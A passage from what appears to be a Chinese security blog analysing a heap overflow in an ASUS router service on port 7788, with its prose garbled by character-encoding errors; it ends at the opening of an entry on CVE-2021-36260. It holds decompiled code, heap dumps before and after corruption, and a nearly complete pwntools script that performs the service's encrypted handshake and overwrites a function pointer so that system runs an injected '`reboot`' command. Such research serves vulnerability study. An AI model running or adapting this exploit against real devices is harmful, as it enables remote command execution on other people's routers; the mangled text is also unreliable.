<p>æˆ‘ä»¬å‘ç°æ­¤ç»“æ„ä½“åé¢å‡ ä¸ªå˜é‡éƒ½æ˜¯å‡½æ•°æŒ‡é’ˆï¼Œå…¶ä¸­ç¬¬ 8 ä¸ªæˆå‘˜ä¼šåœ¨ EVP_CIPHER_CTX_reset å‡½æ•°ä¸­è¢«ä½¿ç”¨</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">EVP_CIPHER_CTX_reset</span><span class="params">(_DWORD *evp_cipher_st)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> (*v2)(<span class="type">void</span>); <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !evp_cipher_st )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*evp_cipher_st )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    CRYPTO_free();</span><br><span class="line">    ENGINE_finish(evp_cipher_st[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(evp_cipher_st, <span class="number">0</span>, <span class="number">0x8C</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = *(<span class="type">int</span> (**)(<span class="type">void</span>))(*evp_cipher_st + <span class="number">0x1C</span>);    <span class="comment">// call struct pointer here</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 || (result = v2()) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( evp_cipher_st[<span class="number">24</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(*evp_cipher_st + <span class="number">32</span>) )</span><br><span class="line">        OPENSSL_cleanse();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæˆ‘ä»¬é€šè¿‡å †æº¢å‡ºèƒ½å¤Ÿå°† EVP_CIPHER_CTX ä¸­ç¬¬ä¸€ä¸ªæˆå‘˜æŒ‡é’ˆåŠ«æŒåˆ°ä¸€å¯æ§å†…å­˜ï¼Œå°±èƒ½åŠ«æŒç¨‹åºçš„æ§åˆ¶æµã€‚</p>
<p><strong>æ ·ä¾‹åˆ©ç”¨è¿‡ç¨‹</strong></p>
<p>é¦–å…ˆå®Œæˆä¸Šè¿°æ¡æ‰‹æµç¨‹ï¼Œåœ¨æ¡æ‰‹æµç¨‹æœŸé—´ç¨‹åºä¼šå¤šæ¬¡è°ƒç”¨ mallocã€free ç­‰å‡½æ•°ï¼Œheap æœ‰è¾ƒå¤§å˜åŒ–ï¼Œä¸€å®šæƒ…å†µä¸‹å°†å½¢æˆä»¥ä¸‹å¸ƒå±€</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|        user_control_chunk         |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|        EVP_CIPHER_CTX             |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>EVP_CIPHER_CTX ç»“æ„ä½“ç›¸è·ç”¨æˆ·å¯æ§è¾“å…¥è·ç¦»ä¸º 0x30 å­—èŠ‚ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-1.png"
                     
                ></p>
<p>åˆå§‹å†…å­˜å¸ƒå±€ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xb64009f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xb6400a08:	0x00000000	0x0000001d	0xb6400938	0x00000000</span><br><span class="line">0xb6400a18:	0x00000000	0x00000000	0x00000000	0x00000095</span><br><span class="line">0xb6400a28:	0xb6e67b1c	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬æ„é€ æ•°æ®ï¼Œåˆšå¥½è¦†ç›–æ‰ EVP_CIPHER_CTX ç¬¬ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œä½¿ 0xb6400a28 &#x3D; 0xb64009f8ï¼Œ0xb6400a14 &#x3D; system@pltï¼Œ0xb6400a2c &#x3D; `reboot`</p>
<p>æ„é€ åå†…å­˜å¸ƒå±€ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xb64009f8:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xb6400a08:	0x00000000	0x00000000	0x00000000	0x000143d4</span><br><span class="line">0xb6400a18:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xb6400a28:	0xb64009f8	0x62657260	0x60746f6f	0x61616161</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ libcrypto.so.1.1 ä¸­çš„ EVP_CIPHER_CTX_reset å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œå½“æ‰§è¡Œåˆ°è°ƒç”¨å‡½æ•°æŒ‡é’ˆæ—¶ç¨‹åºçŠ¶æ€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-2.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/tfc2021-ax56u-3.png"
                     
                ></p>
<p>æ­¤æ—¶å°±èƒ½æ‰§è¡Œæˆ‘ä»¬è®¾ç½®çš„å‘½ä»¤ã€‚</p>
<p><strong>æ ·ä¾‹è°ƒè¯•ç¨‹åº</strong></p>
<p>è°ƒè¯•è„šæœ¬(é EXP)å¦‚ä¸‹ï¼Œæ„Ÿå…´è¶£çš„è¯å¯ä»¥è‡ªè¡Œè°ƒè¯•åˆ†æã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA <span class="keyword">as</span> rsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">crc32_table =[</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x77073096</span>, <span class="number">0xEE0E612C</span>, <span class="number">0x990951BA</span>,</span><br><span class="line"><span class="number">0x076DC419</span>, <span class="number">0x706AF48F</span>, <span class="number">0xE963A535</span>, <span class="number">0x9E6495A3</span>,</span><br><span class="line"><span class="number">0x0EDB8832</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0xE0D5E91E</span>, <span class="number">0x97D2D988</span>,</span><br><span class="line"><span class="number">0x09B64C2B</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE7B82D07</span>, <span class="number">0x90BF1D91</span>,</span><br><span class="line"><span class="number">0x1DB71064</span>, <span class="number">0x6AB020F2</span>, <span class="number">0xF3B97148</span>, <span class="number">0x84BE41DE</span>,</span><br><span class="line"><span class="number">0x1ADAD47D</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0xF4D4B551</span>, <span class="number">0x83D385C7</span>,</span><br><span class="line"><span class="number">0x136C9856</span>, <span class="number">0x646BA8C0</span>, <span class="number">0xFD62F97A</span>, <span class="number">0x8A65C9EC</span>,</span><br><span class="line"><span class="number">0x14015C4F</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFA0F3D63</span>, <span class="number">0x8D080DF5</span>,</span><br><span class="line"><span class="number">0x3B6E20C8</span>, <span class="number">0x4C69105E</span>, <span class="number">0xD56041E4</span>, <span class="number">0xA2677172</span>,</span><br><span class="line"><span class="number">0x3C03E4D1</span>, <span class="number">0x4B04D447</span>, <span class="number">0xD20D85FD</span>, <span class="number">0xA50AB56B</span>,</span><br><span class="line"><span class="number">0x35B5A8FA</span>, <span class="number">0x42B2986C</span>, <span class="number">0xDBBBC9D6</span>, <span class="number">0xACBCF940</span>,</span><br><span class="line"><span class="number">0x32D86CE3</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xDCD60DCF</span>, <span class="number">0xABD13D59</span>,</span><br><span class="line"><span class="number">0x26D930AC</span>, <span class="number">0x51DE003A</span>, <span class="number">0xC8D75180</span>, <span class="number">0xBFD06116</span>,</span><br><span class="line"><span class="number">0x21B4F4B5</span>, <span class="number">0x56B3C423</span>, <span class="number">0xCFBA9599</span>, <span class="number">0xB8BDA50F</span>,</span><br><span class="line"><span class="number">0x2802B89E</span>, <span class="number">0x5F058808</span>, <span class="number">0xC60CD9B2</span>, <span class="number">0xB10BE924</span>,</span><br><span class="line"><span class="number">0x2F6F7C87</span>, <span class="number">0x58684C11</span>, <span class="number">0xC1611DAB</span>, <span class="number">0xB6662D3D</span>,</span><br><span class="line"><span class="number">0x76DC4190</span>, <span class="number">0x01DB7106</span>, <span class="number">0x98D220BC</span>, <span class="number">0xEFD5102A</span>,</span><br><span class="line"><span class="number">0x71B18589</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x9FBFE4A5</span>, <span class="number">0xE8B8D433</span>,</span><br><span class="line"><span class="number">0x7807C9A2</span>, <span class="number">0x0F00F934</span>, <span class="number">0x9609A88E</span>, <span class="number">0xE10E9818</span>,</span><br><span class="line"><span class="number">0x7F6A0DBB</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x91646C97</span>, <span class="number">0xE6635C01</span>,</span><br><span class="line"><span class="number">0x6B6B51F4</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x856530D8</span>, <span class="number">0xF262004E</span>,</span><br><span class="line"><span class="number">0x6C0695ED</span>, <span class="number">0x1B01A57B</span>, <span class="number">0x8208F4C1</span>, <span class="number">0xF50FC457</span>,</span><br><span class="line"><span class="number">0x65B0D9C6</span>, <span class="number">0x12B7E950</span>, <span class="number">0x8BBEB8EA</span>, <span class="number">0xFCB9887C</span>,</span><br><span class="line"><span class="number">0x62DD1DDF</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x8CD37CF3</span>, <span class="number">0xFBD44C65</span>,</span><br><span class="line"><span class="number">0x4DB26158</span>, <span class="number">0x3AB551CE</span>, <span class="number">0xA3BC0074</span>, <span class="number">0xD4BB30E2</span>,</span><br><span class="line"><span class="number">0x4ADFA541</span>, <span class="number">0x3DD895D7</span>, <span class="number">0xA4D1C46D</span>, <span class="number">0xD3D6F4FB</span>,</span><br><span class="line"><span class="number">0x4369E96A</span>, <span class="number">0x346ED9FC</span>, <span class="number">0xAD678846</span>, <span class="number">0xDA60B8D0</span>,</span><br><span class="line"><span class="number">0x44042D73</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAA0A4C5F</span>, <span class="number">0xDD0D7CC9</span>,</span><br><span class="line"><span class="number">0x5005713C</span>, <span class="number">0x270241AA</span>, <span class="number">0xBE0B1010</span>, <span class="number">0xC90C2086</span>,</span><br><span class="line"><span class="number">0x5768B525</span>, <span class="number">0x206F85B3</span>, <span class="number">0xB966D409</span>, <span class="number">0xCE61E49F</span>,</span><br><span class="line"><span class="number">0x5EDEF90E</span>, <span class="number">0x29D9C998</span>, <span class="number">0xB0D09822</span>, <span class="number">0xC7D7A8B4</span>,</span><br><span class="line"><span class="number">0x59B33D17</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB7BD5C3B</span>, <span class="number">0xC0BA6CAD</span>,</span><br><span class="line"><span class="number">0xEDB88320</span>, <span class="number">0x9ABFB3B6</span>, <span class="number">0x03B6E20C</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line"><span class="number">0xEAD54739</span>, <span class="number">0x9DD277AF</span>, <span class="number">0x04DB2615</span>, <span class="number">0x73DC1683</span>,</span><br><span class="line"><span class="number">0xE3630B12</span>, <span class="number">0x94643B84</span>, <span class="number">0x0D6D6A3E</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line"><span class="number">0xE40ECF0B</span>, <span class="number">0x9309FF9D</span>, <span class="number">0x0A00AE27</span>, <span class="number">0x7D079EB1</span>,</span><br><span class="line"><span class="number">0xF00F9344</span>, <span class="number">0x8708A3D2</span>, <span class="number">0x1E01F268</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line"><span class="number">0xF762575D</span>, <span class="number">0x806567CB</span>, <span class="number">0x196C3671</span>, <span class="number">0x6E6B06E7</span>,</span><br><span class="line"><span class="number">0xFED41B76</span>, <span class="number">0x89D32BE0</span>, <span class="number">0x10DA7A5A</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line"><span class="number">0xF9B9DF6F</span>, <span class="number">0x8EBEEFF9</span>, <span class="number">0x17B7BE43</span>, <span class="number">0x60B08ED5</span>,</span><br><span class="line"><span class="number">0xD6D6A3E8</span>, <span class="number">0xA1D1937E</span>, <span class="number">0x38D8C2C4</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line"><span class="number">0xD1BB67F1</span>, <span class="number">0xA6BC5767</span>, <span class="number">0x3FB506DD</span>, <span class="number">0x48B2364B</span>,</span><br><span class="line"><span class="number">0xD80D2BDA</span>, <span class="number">0xAF0A1B4C</span>, <span class="number">0x36034AF6</span>, <span class="number">0x41047A60</span>,</span><br><span class="line"><span class="number">0xDF60EFC3</span>, <span class="number">0xA867DF55</span>, <span class="number">0x316E8EEF</span>, <span class="number">0x4669BE79</span>,</span><br><span class="line"><span class="number">0xCB61B38C</span>, <span class="number">0xBC66831A</span>, <span class="number">0x256FD2A0</span>, <span class="number">0x5268E236</span>,</span><br><span class="line"><span class="number">0xCC0C7795</span>, <span class="number">0xBB0B4703</span>, <span class="number">0x220216B9</span>, <span class="number">0x5505262F</span>,</span><br><span class="line"><span class="number">0xC5BA3BBE</span>, <span class="number">0xB2BD0B28</span>, <span class="number">0x2BB45A92</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line"><span class="number">0xC2D7FFA7</span>, <span class="number">0xB5D0CF31</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0x5BDEAE1D</span>,</span><br><span class="line"><span class="number">0x9B64C2B0</span>, <span class="number">0xEC63F226</span>, <span class="number">0x756AA39C</span>, <span class="number">0x026D930A</span>,</span><br><span class="line"><span class="number">0x9C0906A9</span>, <span class="number">0xEB0E363F</span>, <span class="number">0x72076785</span>, <span class="number">0x05005713</span>,</span><br><span class="line"><span class="number">0x95BF4A82</span>, <span class="number">0xE2B87A14</span>, <span class="number">0x7BB12BAE</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line"><span class="number">0x92D28E9B</span>, <span class="number">0xE5D5BE0D</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0x0BDBDF21</span>,</span><br><span class="line"><span class="number">0x86D3D2D4</span>, <span class="number">0xF1D4E242</span>, <span class="number">0x68DDB3F8</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line"><span class="number">0x81BE16CD</span>, <span class="number">0xF6B9265B</span>, <span class="number">0x6FB077E1</span>, <span class="number">0x18B74777</span>,</span><br><span class="line"><span class="number">0x88085AE6</span>, <span class="number">0xFF0F6A70</span>, <span class="number">0x66063BCA</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line"><span class="number">0x8F659EFF</span>, <span class="number">0xF862AE69</span>, <span class="number">0x616BFFD3</span>, <span class="number">0x166CCF45</span>,</span><br><span class="line"><span class="number">0xA00AE278</span>, <span class="number">0xD70DD2EE</span>, <span class="number">0x4E048354</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line"><span class="number">0xA7672661</span>, <span class="number">0xD06016F7</span>, <span class="number">0x4969474D</span>, <span class="number">0x3E6E77DB</span>,</span><br><span class="line"><span class="number">0xAED16A4A</span>, <span class="number">0xD9D65ADC</span>, <span class="number">0x40DF0B66</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line"><span class="number">0xA9BCAE53</span>, <span class="number">0xDEBB9EC5</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x30B5FFE9</span>,</span><br><span class="line"><span class="number">0xBDBDF21C</span>, <span class="number">0xCABAC28A</span>, <span class="number">0x53B39330</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line"><span class="number">0xBAD03605</span>, <span class="number">0xCDD70693</span>, <span class="number">0x54DE5729</span>, <span class="number">0x23D967BF</span>,</span><br><span class="line"><span class="number">0xB3667A2E</span>, <span class="number">0xC4614AB8</span>, <span class="number">0x5D681B02</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line"><span class="number">0xB40BBE37</span>, <span class="number">0xC30C8EA1</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x2D02EF8D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc32</span>(<span class="params">binaries</span>):</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(binaries):</span><br><span class="line">        crc = crc32_table[(crc &amp; <span class="number">0xFF</span>) ^ binaries[index]] ^ (crc//<span class="number">256</span>)</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> crc</span><br><span class="line"></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"><span class="comment"># ---- udp heap overflow poc ----</span></span><br><span class="line"><span class="comment"># opcode = 1</span></span><br><span class="line"><span class="comment"># unknow2 = 0xffffffff</span></span><br><span class="line"><span class="comment"># unknow3 = 0xffffffff</span></span><br><span class="line"><span class="comment"># padding = b&quot;\x61&quot; * (0x7ff - 12)</span></span><br><span class="line"><span class="comment"># payload = p32(opcode) + p32(unknow2) + p32(unknow3) + padding</span></span><br><span class="line"><span class="comment"># print(len(payload))</span></span><br><span class="line"><span class="comment"># p = remote(&quot;192.168.50.1&quot;, 7788, typ=&quot;udp&quot;)</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)   <span class="comment"># connect to server</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREQ_KU ----</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Get public key...&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x1</span></span><br><span class="line">tlv_len = <span class="number">0x1</span></span><br><span class="line">tlv_crc = <span class="number">0x0</span></span><br><span class="line">tlv = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">REQ_NC = p32(opcode) + p32(tlv_len) + p32(tlv_crc) + tlv    <span class="comment"># request for public key</span></span><br><span class="line">p.send(REQ_NC)</span><br><span class="line">p.recv(<span class="number">12</span>)    <span class="comment"># skip header</span></span><br><span class="line">public_key = p.recv()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(public_key)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./public.rsa&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(public_key)</span><br><span class="line">f.close()</span><br><span class="line">p.close()</span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processACK_GROUPID ----</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">_rop = aes_encode(<span class="string">b&quot;\x61&quot;</span> * <span class="number">0x10</span>, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x2a</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0x10</span>) + p32(<span class="number">0</span>) + _rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.close()</span><br><span class="line"><span class="comment"># -------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- create tlv data ----</span></span><br><span class="line">banner1 = <span class="number">0x1</span></span><br><span class="line">data1_len = <span class="number">32</span>    <span class="comment"># aes256</span></span><br><span class="line">aes_key = <span class="string">b&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">aes_crc = crc32(aes_key) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">banner2 = <span class="number">0x3</span></span><br><span class="line">data2_len = <span class="number">0x8</span></span><br><span class="line">data2 = <span class="string">b&quot;b&quot;</span> * <span class="number">0x8</span></span><br><span class="line">data2_crc = crc32(data2) &amp; <span class="number">0xffffffff</span></span><br><span class="line">tlv = p32(banner1) + p32(data1_len) + p32(aes_crc) + aes_key + p32(banner2) + p32(data2_len) + p32(data2_crc) + data2</span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- rsa encrypt ----</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./public.rsa&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    pubobj = rsa.importKey(key)</span><br><span class="line">    pubobj = PKCS1_v1_5.new(pubobj)</span><br><span class="line">    enc_text = pubobj.encrypt(tlv)</span><br><span class="line"><span class="comment"># ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- create payload data ----</span></span><br><span class="line">tlv_len = <span class="built_in">len</span>(enc_text)</span><br><span class="line">tlv_crc = crc32(enc_text)</span><br><span class="line">payload = p32(tlv_len) + p32(tlv_crc) + enc_text</span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREQ_NC ----</span></span><br><span class="line">opcode = <span class="number">0x3</span></span><br><span class="line">data = p32(opcode) + payload</span><br><span class="line">p = remote(<span class="string">&quot;192.168.50.1&quot;</span>, <span class="number">7788</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.recv(<span class="number">12</span>)    <span class="comment"># skip header</span></span><br><span class="line">aes_enc_data = p.recv()</span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- aes decrypt ----</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(<span class="built_in">str</span>.encode(key), AES.MODE_ECB)</span><br><span class="line">    decrypted_text = aes.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line">server_nonce_data2 = aes_decode(aes_enc_data, <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">server_nonce = server_nonce_data2[<span class="number">12</span>:<span class="number">12</span> + <span class="number">32</span>]</span><br><span class="line">custom_data = <span class="string">b&quot;bbbbbbbb&quot;</span></span><br><span class="line">_<span class="built_in">hash</span> = hashlib.sha256()</span><br><span class="line">_<span class="built_in">hash</span>.update(<span class="string">b&quot;A22AAC3EB69F9943ED8929D810A077A3&quot;</span> + server_nonce + custom_data)</span><br><span class="line">session_key = _<span class="built_in">hash</span>.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(session_key)</span><br><span class="line"><span class="comment"># ---------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- cm_processREP_OK ----</span></span><br><span class="line">opcode = <span class="number">0x5</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">p.send(payload)    <span class="comment"># if server return 0x6000000, means success.</span></span><br><span class="line">res = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">if</span> res != <span class="number">6</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Error: handshake failed.&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Handshake successed.&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----cm_processREQ_JOIN ----</span></span><br><span class="line"><span class="comment"># def aes_encode(data, key):</span></span><br><span class="line"><span class="comment">#     aes = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line"><span class="comment">#     return aes.encrypt(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode = 0xf</span></span><br><span class="line"><span class="comment"># _payload = b&quot;a&quot; * 0x100</span></span><br><span class="line"><span class="comment"># _rop = aes_encode(_payload, bytes.fromhex(session_key))</span></span><br><span class="line"><span class="comment"># payload = p32(opcode) + p32(0xffffffff) + p32(0) + _rop</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># path2</span></span><br><span class="line"><span class="comment"># ---- cm_processACK_GROUPID ----</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">_payload = <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x1c</span>) + <span class="string">b&#x27;\xd4\x43\x01\x00&#x27;</span> +  <span class="string">b&quot;\x61&quot;</span> * (<span class="number">0x30</span> - <span class="number">0x20</span>) + <span class="string">b&quot;xxxx&quot;</span> + <span class="string">b&quot;`reboot`aaaa&quot;</span></span><br><span class="line">_rop = aes_encode(_payload, <span class="string">b&quot;12345678000000000000000000000000&quot;</span>)</span><br><span class="line">opcode = <span class="number">0x2a</span></span><br><span class="line">payload = p32(opcode) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + _rop    <span class="comment"># malloc 0x4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="comment"># -------------------------------</span></span><br></pre></td></tr></table></figure></div>

<p>PSï¼šcm_processACK_GROUPID åŠŸèƒ½ä¸­çš„ AES è§£å¯†å¯†é’¥ä» get_onboarding_key å‡½æ•°è€Œæ¥ï¼Œå¯é€šè¿‡è°ƒè¯•è·å–ã€‚</p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ­¤æœåŠ¡æ‰€åœ¨ç¨‹åºåªèƒ½ä»å†…ç½‘è®¿é—®ï¼Œæ‰€ä»¥å±å®³æœ‰é™ã€‚</p>
<p>åˆ©ç”¨æ­¤æ¼æ´éœ€è¦ä¸€äº›ç‰¹æ®Šçš„å†…å­˜å¸ƒå±€ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯è‡ªè¡Œå°è¯•å…¶å®ƒæ›´ç¨³å®šçš„åˆ©ç”¨æ‰‹æ®µã€‚</p>
<p>å¦‚æ–‡ç« æœ‰è¯¯æ•¬è¯·æŒ‡æ­£ï¼Œæ¬¢è¿æ¥ä¿¡è®¨è®ºã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-36260</title>
    <url>/2021/10/18/CVE-2021-36260/</url>
    <content><![CDATA[<p>2021 å¹´ 09 æœˆ 18 æ—¥, <a class="link"   href="https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html" >ä¸€ç¯‡åšå®¢<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>å…¬å¼€äº†ä¸€ä¸ªå½±å“æµ·åº·å¨è§† IPC&#x2F;NVR å¤šä¸ªå‹å·è®¾å¤‡çš„æœªæˆæƒä»£ç æ‰§è¡Œå®‰å…¨é£é™©ï¼Œç¼–å·ä¸º CVE-2021-36260ï¼Œæœ¬æ–‡æ­¤æ¼æ´è¿›è¡Œå¤ç°åˆ†æã€‚</p>
<span id="more"></span>

